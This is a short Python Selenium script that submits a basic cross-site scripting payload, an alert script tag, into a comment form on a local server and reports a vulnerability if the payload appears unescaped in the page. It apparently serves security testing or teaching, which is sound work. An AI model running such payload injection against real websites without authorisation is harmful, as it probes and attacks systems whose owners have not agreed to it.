from selenium import webdriver

def test_xss(url, payload):
    driver = webdriver.Chrome()  # Ensure ChromeDriver is installed
    driver.get(url)
    comment_box = driver.find_element("name", "comment")
    comment_box.send_keys(payload)
    driver.find_element("name", "submit").click()
    if payload in driver.page_source:
        print("XSS Vulnerability Found!")
    driver.quit()

url = "http://127.0.0.1:5000/comment"
payload = "<script>alert('XSS');</script>"
test_xss(url, payload)
